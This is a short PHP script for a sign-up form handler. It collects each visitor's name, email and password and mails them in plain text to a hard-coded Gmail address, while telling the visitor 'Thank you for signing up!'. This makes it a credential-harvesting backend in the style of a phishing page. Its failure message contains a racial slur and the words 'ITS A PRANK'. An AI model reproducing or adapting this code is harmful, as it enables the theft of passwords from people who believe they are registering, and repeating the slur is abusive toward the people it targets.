<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Email details
    $to = "indiangamer.1291@gmail.com"; // Replace with your email
    $subject = "New Sign Up Information";
    $message = "Name: $name\nEmail: $email\nPassword: $password";
    $headers = "From: https://ninja-1234.github.io"; // Replace with your domain

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Thank you for signing up!";
    } else {
        echo "ITS A PRANK NIGGA!! FUCK U >:";
    }
}
?>
